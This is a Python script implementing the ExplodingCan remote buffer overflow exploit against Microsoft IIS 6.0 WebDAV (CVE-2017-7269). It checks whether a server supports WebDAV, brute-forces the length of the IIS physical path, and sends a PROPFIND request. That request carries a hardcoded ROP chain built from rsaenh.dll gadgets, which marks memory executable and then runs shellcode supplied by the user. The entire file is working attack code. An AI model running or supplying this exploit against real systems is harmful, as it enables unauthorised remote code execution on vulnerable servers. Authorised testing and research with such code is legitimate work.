#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# An implementation of NSA's ExplodingCan exploit
# Microsoft IIS WebDav 'ScStoragePathFromUrl' Remote Buffer Overflow
# CVE-2017-7269 
#
# by @danigargu
#
#

import re
import sys
import socket
import requests
import httplib
import string
import time
import random
import sys

from urlparse import urlparse
from struct import pack

REQUEST_TIMEOUT = 10
DEFAULT_IIS_PATH_SIZE = len("C:\Inetpub\wwwroot")

def decode(data):
    return data.decode("utf-8").encode("utf-16le")

def encode(data):
    return data.decode("utf-16le").encode("utf-8")

p = lambda x : pack("<L", x) # pack

def rand_text_alpha(size):
    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(size))

def supports_webdav(headers):
    if "DAV" in headers.get('MS-Author-Via','') or \
        headers.get('DASL','') == '<DAV:sql>' or \
        re.match('^[\d]+(,\s+[\d]+)?$', headers.get('DAV','')) or \
        "PROPFIND" in headers.get('Public','') or \
        "PROPFIND" in headers.get('Allow',''):
        return True
    return False

def check(url):
    r = requests.request('OPTIONS', url, timeout=REQUEST_TIMEOUT)
    if r.status_code != 200:
        print("[-] Status code: %d" % r.status_code)
        return False

    print("[*] Server found: %s" % r.headers['Server'])
    if "IIS/6.0" in r.headers['Server'] and supports_webdav(r.headers):
        return True
    return False

def find_iis_path_len(url, min_len=3, max_len=70, delay=0):
    idx  = 0
    junk = 60
    found = False
    iis_path_len = None
    cur_size = max_len

    assert max_len <= 130, "Max length exceeded (130)"
    init_lenght = 130-max_len

    while not found and cur_size > min_len:
        cur_size = (max_len-idx)
        to_brute = rand_text_alpha(init_lenght+idx)         
        base_query = "<http://localhost/%s> (Not <locktoken:write1>) <http://localhost/>" % to_brute

        sys.stdout.write("[*] Trying with size: %d\r" % cur_size)
        sys.stdout.flush()      
        try:
            r = requests.request('PROPFIND', url, 
                    timeout=REQUEST_TIMEOUT, headers={
                        'Content-Length': '0',
                        'Host': 'localhost',
                        'If': base_query
                    })

            if r.status_code == 500:
                iis_path_len = (max_len-idx)
                found = True
            idx += 1
            time.sleep(delay)

        # requests.exceptions.ReadTimeout
        except requests.exceptions.ConnectionError as e:
            print("[-] ERROR: %s" % e.message)
            break

    if iis_path_len and iis_path_len == max_len:
        iis_path_len = None
    
    return iis_path_len

def make_payload(p_url, iis_path_len, shellcode):
    url = p_url.geturl()
    payload = "PROPFIND / HTTP/1.1\r\n"
    payload += "Host: %s\r\n" % p_url.netloc
    payload += "Content-Length: 0\r\n"
    payload += "If: <%s/a" % url

    junk = (128-iis_path_len) * 2

    p1  = rand_text_alpha(junk) # Varies the length given its IIS physical path
    p1 += p(0x02020202)
    p1 += p(0x680312c0) # str pointer to .data httpext.dll
    p1 += rand_text_alpha(24)
    p1 += p(0x680313c0) # destination pointer used with memcpy
    p1 += rand_text_alpha(12)
    p1 += p(0x680313c0) # destination pointer used with memcpy
    
    payload += encode(p1)

    payload += "> (Not <locktoken:write1>) "
    payload += "<%s/b" % url

    p2  = rand_text_alpha(junk - 4)
    p2 += p(0x680313c0)

    """
    Stack adjust:

    rsaenh.dll:68006E4F  pop     esi
    rsaenh.dll:68006E50  pop     ebp
    rsaenh.dll:68006E51  retn    20h
    """

    p2 += p(0x68006e4f) # StackAdjust
    p2 += p(0x68006e4f) # StackAdjust
    p2 += rand_text_alpha(4)
    p2 += p(0x680313c0)
    p2 += p(0x680313c0)
    p2 += rand_text_alpha(12)

    """
    rsaenh.dll:68016082  mov     esp, ecx
    rsaenh.dll:68016084  mov     ecx, [eax]
    rsaenh.dll:68016086  mov     eax, [eax+4]
    rsaenh.dll:68016089  push    eax
    rsaenh.dll:6801608A  retn
    """

    p2 += p(0x68016082)
    p2 += rand_text_alpha(12)
    p2 += p(0x6800b113) # push 0x40 - PAGE_EXECUTE_READWRITE
    p2 += rand_text_alpha(4)
    p2 += p(0x680124e3) # JMP [EBX]
    p2 += p(0x68031460) # shellcode address
    p2 += p(0x7ffe0300) # ntdll!KiFastSystemCall address
    p2 += p(0xffffffff)
    p2 += p(0x680313c0)
    p2 += p(0x6803046e) 
    p2 += rand_text_alpha(4)
    p2 += p(0x68031434)
    p2 += p(0x680129e7) # leave; ret

    """
    rsaenh.dll:68009391  pop     eax
    rsaenh.dll:68009392  pop     ebp
    rsaenh.dll:68009393  retn    4
    """

    p2 += p(0x68009391)
    p2 += rand_text_alpha(16)
    p2 += p(0x6803141c)

    """
    rsaenh.dll:68006E05  lea     esp, [ebp-20h]
    rsaenh.dll:68006E08  pop     edi
    rsaenh.dll:68006E09  pop     esi
    rsaenh.dll:68006E0A  pop     ebx
    rsaenh.dll:68006E0B  leave
    rsaenh.dll:68006E0C  retn    24h
    """

    p2 += p(0x68006e05)
    p2 += rand_text_alpha(12)
    p2 += p(0x68008246) # EAX val address
    p2 += rand_text_alpha(4)

    """
    Load 0x8F in EAX: NtProtectVirtualMemory syscall (Windows 2003 Server)

    rsaenh.dll:68021DAA  mov     eax, [eax+110h]
    rsaenh.dll:68021DB0  pop     ebp
    rsaenh.dll:68021DB1  retn    4
    """

    p2 += p(0x68021daa)
    p2 += rand_text_alpha(4)
    p2 += p(0x680313f8)
    p2 += p(0x680129e7) # leave; ret

    payload += encode(p2)

    """
    stack restore:

    90             nop
    31db           xor ebx, ebx
    b308           mov bl, 8
    648b23         mov esp, dword fs:[ebx]
    6681c40008     add sp, 0x800
    90             nop
    """
    payload += encode("9031DBB308648B236681C4000890".decode("hex"))
    payload += encode(shellcode)
    payload += ">\r\n\r\n"

    return payload

def send_exploit(p_url, data):
    host = p_url.hostname
    port = p_url.port if p_url.port else 80
    vulnerable = False
    recv_data  = None

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(50)
        sock.connect((host, port))
        sock.send(data)
        recv_data = sock.recv(1024)
        sock.close()
    except socket.timeout:
        print("[*] Socket timeout")
        vulnerable = True
    except socket.error as e:     
        if e.errno == 54:
            print("[*] Connection reset by peer")
            vulnerable = True
    return (vulnerable, recv_data)

def main():    
    if len(sys.argv) < 3:
        print("Usage: %s <url> <shellcode-file>" % sys.argv[0])
        return

    try:
        url = sys.argv[1]
        sc_file = sys.argv[2]
        p_url = urlparse(url)
        shellcode = None

        with open(sc_file, 'rb') as f:
            shellcode = f.read()

        print("[*] Using URL: %s" % url)
        if not check(url):
            print("[-] Server not vulnerable")
            return

        iis_path_len = find_iis_path_len(url)
        if not iis_path_len:
            print("[-] Unable to determine IIS path size")
            return

        print("[*] Found IIS path size: %d" % iis_path_len)
        if iis_path_len == DEFAULT_IIS_PATH_SIZE:
            print("[*] Default IIS path: C:\Inetpub\wwwroot")

        r = requests.request('PROPFIND', url, timeout=REQUEST_TIMEOUT)
        if r and r.status_code == 207:
            print("[*] WebDAV request: OK")
            payload = make_payload(p_url, iis_path_len, shellcode)

            print("[*] Payload len: %d" % len(payload))
            print("[*] Sending payload...")
            vuln, recv_data = send_exploit(p_url, payload)

            if vuln:
                print("[+] The host is maybe vulnerable")
            if recv_data:
                print(recv_data)   
        else:
            print("[-] Server did not respond correctly to WebDAV request")
            return
            
    except Exception as e:
        print("[-] %s" % e)

if __name__ == '__main__':
    main()

